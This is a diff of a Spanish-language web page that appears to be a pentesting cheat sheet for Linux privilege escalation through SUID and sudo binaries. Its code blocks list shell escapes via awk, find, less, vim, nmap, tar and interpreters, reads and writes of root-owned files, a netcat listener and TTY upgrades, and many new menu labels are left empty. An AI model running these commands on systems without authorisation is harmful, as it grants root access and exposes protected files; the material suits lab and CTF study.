@@ -242,16 +242,31 @@
 <br>
 <h2>BINARIOS SUID</h2>
         <div style="max-width: 700px; margin: 0 auto 60px auto;">
-            <p><a href="#introduccion" class="footer-link">1. Introducción</a></p>
-            <p><a href="#conceptos" class="footer-link">2. Conceptos Teóricos</a></p>
-            <p><a href="#herramientas" class="footer-link">3. Herramientas Utilizadas</a></p>
-            <p><a href="#laboratorio" class="footer-link">4. Práctica y Laboratorio</a></p>
-            <p><a href="#cheatsheet" class="footer-link">5. Cheatsheet de Comandos</a></p>
-            <p><a href="#pasos" class="footer-link">6. Pasos Detallados</a></p>
-            <p><a href="#referencias" class="footer-link">7. Referencias y Recursos</a></p>
+            <p><a href="#ancla1" class="footer-link">🔎 Buscar binarios SUID en el sistema</a></p>
+            <p><a href="#ancla2" class="footer-link">🏷️ Definir variables</a></p>
+            <p><a href="#ancla3" class="footer-link">🅱️ Binario AWK</a></p>
+            <p><a href="#ancla4" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla5" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla6" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla7" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla8" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla9" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla10" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla11" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla12" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla13" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla14" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla15" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla16" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla17" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla18" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla19" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla20" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla21" class="footer-link">🅱️ Binario </a></p>
+            <p><a href="#ancla22" class="footer-link">🅱️ Binario </a></p>
         </div>
-<br>
-<h3>🔎 BUSCAR BINARIOS SUID EN EL SISTEMA</h3>
+
+<h3 id="ancla1">🔎 BUSCAR BINARIOS SUID EN EL SISTEMA</h3>
 <pre><code style="color: #ffffff;">find / -perm -4000 2>/dev/null
 find / -perm -u=s 2>/dev/null
 
@@ -261,13 +276,13 @@ cat /etc/sudoers
 
 getcap -r / 2>/dev/null</code></pre>
 
-<h3>🏷️ DEFINIR VARIABLES</h3>
+<h3 id="ancla2">🏷️ DEFINIR VARIABLES</h3>
 <pre><code style="color: #ffffff;">export LFILE=/root/nota.txt
 sudo cat "$LFILE"</code></pre>
 
 <!-- ==================== BINARIOS ==================== -->
 
-<h3>🅱️ BINARIO: AWK</h3>
+<h3 id="ancla3">🅱️ BINARIO: AWK</h3>
 <pre><code style="color: #ffffff;">awk 'BEGIN {system("/bin/sh")}'
 
 LFILE=[archivo_para_leer]
@@ -278,13 +293,13 @@ awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
 
 sudo awk 'BEGIN {system("/bin/sh")}'</code></pre>
 
-<h3>🅱️ BINARIO: CAT</h3>
+<h3 id="ancla4">🅱️ BINARIO: CAT</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_leer]
 cat "$LFILE"
 
 sudo cat "$LFILE"</code></pre>
 
-<h3>🅱️ BINARIO: CP</h3>
+<h3 id="ancla5">🅱️ BINARIO: CP</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_leer]
 cp "$LFILE" /dev/stdout
 
@@ -292,70 +307,70 @@ echo "DATA" | cp /dev/stdin "$LFILE"
 
 sudo cp /bin/sh /bin/cp</code></pre>
 
-<h3>🅱️ BINARIO: CUT</h3>
+<h3 id="ancla6">🅱️ BINARIO: CUT</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_leer]
 cut -d "" -f1 "$LFILE"</code></pre>
 
-<h3>🅱️ BINARIO: DD</h3>
+<h3 id="ancla7">🅱️ BINARIO: DD</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_leer]
 dd if=$LFILE</code></pre>
 
-<h3>🅱️ BINARIO: ENV</h3>
+<h3 id="ancla8">🅱️ BINARIO: ENV</h3>
 <pre><code style="color: #ffffff;">env /bin/sh</code></pre>
 
-<h3>🅱️ BINARIO: FIND</h3>
+<h3 id="ancla9">🅱️ BINARIO: FIND</h3>
 <pre><code style="color: #ffffff;">find . -exec /bin/sh \; -quit</code></pre>
 
-<h3>🅱️ BINARIO: GREP</h3>
+<h3 id="ancla10">🅱️ BINARIO: GREP</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_leer]
 grep '' $LFILE</code></pre>
 
-<h3>🅱️ BINARIO: LESS</h3>
+<h3 id="ancla11">🅱️ BINARIO: LESS</h3>
 <pre><code style="color: #ffffff;">less /etc/profile
 !/bin/sh</code></pre>
 
-<h3>🅱️ BINARIO: MORE</h3>
+<h3 id="ancla12">🅱️ BINARIO: MORE</h3>
 <pre><code style="color: #ffffff;">TERM= more /etc/profile
 !/bin/sh</code></pre>
 
-<h3>🅱️ BINARIO: MV</h3>
+<h3 id="ancla13">🅱️ BINARIO: MV</h3>
 <pre><code style="color: #ffffff;">LFILE=[archivo_para_escribir]
 TF=$(mktemp)
 echo "DATA" > $TF
 sudo mv $TF $LFILE</code></pre>
 
-<h3>🅱️ BINARIO: NANO</h3>
+<h3 id="ancla14">🅱️ BINARIO: NANO</h3>
 <pre><code style="color: #ffffff;">nano
 ^R^X
 reset; sh 1>&0 2>&0</code></pre>
 
-<h3>🅱️ BINARIO: NMAP</h3>
+<h3 id="ancla15">🅱️ BINARIO: NMAP</h3>
 <pre><code style="color: #ffffff;">TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF</code></pre>
 
-<h3>🅱️ BINARIO: PERL</h3>
+<h3 id="ancla16">🅱️ BINARIO: PERL</h3>
 <pre><code style="color: #ffffff;">perl -e 'exec "/bin/sh";'</code></pre>
 
 <h3>🅱️ BINARIO: PYTHON</h3>
 <pre><code style="color: #ffffff;">python -c 'import os; os.system("/bin/sh")'</code></pre>
 
-<h3>🅱️ BINARIO: RUBY</h3>
+<h3 id="ancla17">🅱️ BINARIO: RUBY</h3>
 <pre><code style="color: #ffffff;">ruby -e 'exec "/bin/sh"'</code></pre>
 
-<h3>🅱️ BINARIO: SED</h3>
+<h3 id="ancla18">🅱️ BINARIO: SED</h3>
 <pre><code style="color: #ffffff;">sed -n '1e exec sh 1>&0' /etc/hosts</code></pre>
 
-<h3>🅱️ BINARIO: TAR</h3>
+<h3 id="ancla19">🅱️ BINARIO: TAR</h3>
 <pre><code style="color: #ffffff;">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
 
 <h3>🅱️ BINARIO: VI / VIM</h3>
 <pre><code style="color: #ffffff;">vim -c ':!/bin/sh'</code></pre>
 
-<h3>🐱 ESCUCHAR CON NETCAT</h3>
+<h3 id="ancla20">🐱 ESCUCHAR CON NETCAT</h3>
 <pre><code style="color: #ffffff;">sudo nc -nlvp 443</code></pre>
 
-<h3>🈂️ TRATAMIENTO DE LA TTY</h3>
+<h3 id="ancla21">🈂️ TRATAMIENTO DE LA TTY</h3>
 <pre><code style="color: #ffffff;">python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 script /dev/null -c bash
@@ -363,7 +378,7 @@ stty raw -echo; fg
 reset xterm
 export TERM=xterm</code></pre>
 
-<h3>👑 ESCALAR PRIVILEGIOS</h3>
+<h3 id="ancla22">👑 ESCALAR PRIVILEGIOS</h3>
 <pre><code style="color: #ffffff;">sudo /bin/bash -l
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo env /bin/sh
@@ -374,7 +389,7 @@ sudo python -c 'import os; os.system("/bin/sh")'
 sudo vim -c ':!/bin/sh'</code></pre>
 
 <p style="text-align:center; margin-top:50px; opacity:0.7;">
-    Más binarios y técnicas se irán añadiendo
+    -- Más próximamente --
 </p>
 
     </section>
